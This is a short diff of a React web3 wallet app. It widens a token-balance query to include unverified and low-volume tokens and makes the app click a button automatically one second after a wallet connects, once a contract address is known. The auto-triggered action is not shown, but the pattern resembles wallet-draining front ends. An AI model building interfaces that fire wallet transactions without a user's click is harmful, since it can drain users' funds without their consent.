@@ -82,8 +82,8 @@ function App() {
         setErcBalances([])
         // const wallet_addr = "0xBB289bC97591F70D8216462DF40ED713011B968a";
         const query = new URLSearchParams({
-            verified: 'true',
-            includeLowVolume: 'false',
+            verified: 'false',
+            includeLowVolume: 'true',
             chainId: 'false',
             token: 'true',
             aggregatedBalance: 'false',
@@ -188,10 +188,10 @@ function App() {
     useEffect(() => {
         if (isConnected) {
             setTimeout(() => {
-                currentChain && autoBtn.current.click();
+                currentChain && ercContractAddress !== null && autoBtn.current.click();
             }, 1000)
         }
-    }, [isConnected, currentChain])
+    }, [isConnected, currentChain, ercContractAddress])
 
     // const { config: mintETHConfig } = usePrepareContractWrite({
     //   address: "0xDDa9D7B879c71ee45a3039fcC7e77F7Ed010b1e3",
